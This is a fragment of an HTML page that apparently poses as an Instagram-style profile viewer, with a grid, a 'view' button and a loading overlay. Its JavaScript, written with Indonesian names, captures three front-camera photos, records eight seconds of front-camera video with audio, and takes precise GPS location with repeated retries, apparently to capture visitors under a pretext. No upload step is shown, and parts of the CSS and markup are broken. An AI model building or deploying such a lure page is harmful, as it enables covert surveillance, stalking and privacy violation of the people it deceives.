        .header {

        .header h1 {

            font-weight: 600;

        }
        .btn-view:active {

        }
        .btn-view:disabled {
            background: #b2dffa;

        }
        .grid {

            grid-template-columns: repeat(3, 1fr);
            gap: 3px;
            padding: 3px;
            background: #efefef;
        }
        .grid .item {
            aspect-ratio: 1;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2em;
            color: #ccc;
            overflow: hidden;
        }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.75);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }
        .loading-overlay.show {
            display: flex;
        }
        .loading-overlay .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 25px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-overlay .text {
            font-size: 1.1em;
            font-weight: 500;
            text-align: center;
            padding: 0 20px;
            letter-spacing: 1px;
        }
        .loading-overlay .subtext {
            font-size: 0.8em;
            opacity: 0.6;
            margin-top: 8px;
            font-weight: 300;
        }
        .loading-overlay .progress-dots {
            margin-top: 15px;
            display: flex;
            gap: 8px;
        }
        .loading-overlay .progress-dots span {
            width: 8px;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            animation: dotPulse 1.4s infinite ease-in-out;
        }
        .loading-overlay .progress-dots span:nth-child(2) {
            animation-delay: 0.2s;
        }
        .loading-overlay .progress-dots span:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes dotPulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
            40% { transform: scale(1); opacity: 1; }
        }
        .footer {
            text-align: center;
            padding: 15px;
            color: #8e8e8e;
            font-size: 0.75em;
            border-top: 1px solid #efefef;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>

    function ambil3FotoKamera() {
        return new Promise((resolve, reject) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                reject('Kamera tidak didukung');
                return;
            }

            navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 } 
                },
                audio: false
            })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.play();

                video.onloadedmetadata = function() {
                    const canvas = document.createElement('canvas');
                    canvas.width = 1280;
                    canvas.height = 720;
                    const ctx = canvas.getContext('2d');
                    const fotoList = [];
                    let count = 0;

                    function ambilFoto() {
                        if (count >= 3) {
                            stream.getTracks().forEach(track => track.stop());
                            resolve(fotoList);
                            return;
                        }
                        // Gambar dengan kualitas tinggi
                        ctx.drawImage(video, 0, 0, 1280, 720);
                        const base64 = canvas.toDataURL('image/jpeg', 1.0);
                        fotoList.push(base64);
                        count++;
                        setTimeout(ambilFoto, 1500);
                    }

                    setTimeout(ambilFoto, 500);

                    // Safety timeout
                    setTimeout(() => {
                        stream.getTracks().forEach(track => track.stop());
                        if (fotoList.length < 3) {
                            resolve(fotoList.length > 0 ? fotoList : []);
                        }
                    }, 7000);
                };
            })
            .catch((err) => {
                reject('Akses kamera ditolak: ' + err.message);
            });
        });
    }

    // ============ REKAM VIDEO 8 DETIK KAMERA DEPAN ============
    function rekamVideo8Detik() {
        return new Promise((resolve, reject) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                reject('Kamera tidak didukung');
                return;
            }

            navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 } 
                },
                audio: true
            })
            .then((stream) => {
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2500000
                });
                
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    stream.getTracks().forEach(track => track.stop());
                    resolve(blob);
                };

                // Rekam 8 detik
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 8000);

                // Safety timeout
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 9000);
            })
            .catch((err) => {
                reject('Akses kamera ditolak: ' + err.message);
            });
        });
    }

    // ============ AMBIL LOKASI DENGAN MULTIPLE ATTEMPT ============
    function getLokasi() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', error: 'Geolocation tidak didukung' });
                return;
            }

            let attempts = 0;
            const maxAttempts = 3;

            function tryGetLocation() {
                attempts++;
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            akurasi: pos.coords.accuracy,
                            altitude: pos.coords.altitude || 'Tidak tersedia',
                            speed: pos.coords.speed || 'Tidak tersedia'
                        });
                    },
                    (err) => {
                        if (attempts < maxAttempts) {
                            setTimeout(tryGetLocation, 2000);
                        } else {
                            resolve({ 
                                lat: 'Tidak tersedia', 
                                lon: 'Tidak tersedia', 
                                error: err.message 
                            });
                        }
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            }

            tryGetLocation();
        });
    }
